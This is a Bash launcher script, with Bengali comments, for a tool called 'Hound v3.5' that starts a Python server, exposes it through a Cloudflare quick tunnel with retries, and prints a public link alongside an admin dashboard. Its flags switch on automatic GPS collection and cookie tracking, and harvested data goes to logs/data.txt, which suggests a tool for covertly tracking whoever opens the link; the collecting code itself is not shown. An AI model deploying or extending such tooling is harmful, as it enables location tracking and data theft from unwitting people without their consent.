#!/bin/bash
# Hound v3.5 - Complete Telemetry Engine with Auto-Retry Tunneling
# Usage: ./hound.sh [--internet|--local] [--gps] [--cookie] [--auto] [--viewer] [--port PORT]

PORT=8000
MODE="local"
GPS_AUTO="false"
COOKIE_TRACK="true"
AUTO_COLLECT="true"
START_VIEWER="false"

while [[ $# -gt 0 ]]; do
    case $1 in
        --internet)
            MODE="internet"
            shift
            ;;
        --local)
            MODE="local"
            shift
            ;;
        --gps)
            GPS_AUTO="true"
            shift
            ;;
        --cookie)
            COOKIE_TRACK="true"
            shift
            ;;
        --auto)
            AUTO_COLLECT="true"
            shift
            ;;
        --viewer)
            START_VIEWER="true"
            shift
            ;;
        --port|-p)
            PORT="$2"
            shift 2
            ;;
        *)
            echo "❌ অজানা আর্গুমেন্ট: $1"
            echo "ব্যবহার: ./hound.sh [--internet|--local] [--gps] [--cookie] [--auto] [--viewer] [--port PORT]"
            exit 1
            ;;
    esac
done

if ! command -v python3 &> /dev/null; then
    echo "❌ python3 পাওয়া যায়নি! ইনস্টল করুন: pkg install python"
    exit 1
fi

export PORT=$PORT
export MODE=$MODE
export GPS_AUTO=$GPS_AUTO
export COOKIE_TRACK=$COOKIE_TRACK
export AUTO_COLLECT=$AUTO_COLLECT
export PYTHONUNBUFFERED=1

# আগের কোনো প্রসেস থাকলে ক্লিন করা
pkill -f "cloudflared" 2>/dev/null
pkill -f "app.main" 2>/dev/null
rm -f cf.log

stop_services() {
    printf "\n🛑 সার্ভার বন্ধ করা হচ্ছে...\n"
    kill $SERVER_PID 2>/dev/null
    kill $CLOUD_PID 2>/dev/null
    pkill -f "cloudflared" 2>/dev/null
    pkill -f "app.main" 2>/dev/null
    exit 1
}
trap stop_services 2

clear
printf "🐕 Hound v3.5 (Telemetry & OSINT Engine)\n"
printf "📡 পোর্ট: %s | 🌐 মোড: %s\n" "$PORT" "$MODE"

# Python সার্ভার ব্যাকগ্রাউন্ডে চালু
python3 -m app.main &
SERVER_PID=$!
sleep 2

# ইন্টারনেট মোড (Cloudflare টানেল - রিট্রাই সহ)
if [[ "$MODE" == "internet" ]]; then
    printf "☁️  Cloudflared টানেল তৈরি হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন...\n"
    
    LINK=""
    MAX_RETRIES=3
    RETRY_COUNT=0

    while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
        rm -f cf.log
        pkill -f "cloudflared" 2>/dev/null
        cloudflared tunnel --url http://localhost:$PORT > cf.log 2>&1 &
        CLOUD_PID=$!

        for i in {1..20}; do
            sleep 1
            LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cf.log 2>/dev/null | grep -v 'api.trycloudflare.com' | head -n1)
            if [ -n "$LINK" ]; then
                break 2
            fi
            printf "."
        done

        # EOF এরর বা ফেইল হলে রিট্রাই করবে
        if grep -q "unexpected EOF" cf.log 2>/dev/null || [ -z "$LINK" ]; then
            RETRY_COUNT=$((RETRY_COUNT+1))
            printf "\n⚠️ ক্লাউডফ্লেয়ার কানেকশন ড্রপ করেছে। পুনরায় চেষ্টা করা হচ্ছে (%d/%d)...\n" "$RETRY_COUNT" "$MAX_RETRIES"
            sleep 3
        fi
    done
    printf "\n"

    if [ -z "$LINK" ]; then
        printf "\n❌ Cloudflare টানেল তৈরি করা যায়নি! টার্মিনাল লগ চেক করুন:\n"
        cat cf.log
        stop_services
        exit 1
    fi

    printf "\n================================================\n"
    printf "🔗 পাবলিক লিংক: \033[1;32m%s\033[0m\n" "$LINK"
    printf "📊 অ্যাডমিন ড্যাশবোর্ড: \033[1;34mhttp://localhost:%s/admin\033[0m\n" "$PORT"
    printf "================================================\n"
else
    printf "\n================================================\n"
    printf "🚀 লোকাল লিংক: http://localhost:%s\n" "$PORT"
    printf "📊 অ্যাডমিন ড্যাশবোর্ড: http://localhost:%s/admin\n" "$PORT"
    printf "================================================\n"
fi

printf "📂 লগ ফাইল: logs/data.txt\n"
printf "🛑 বন্ধ করতে: CTRL+C\n"

wait $SERVER_PID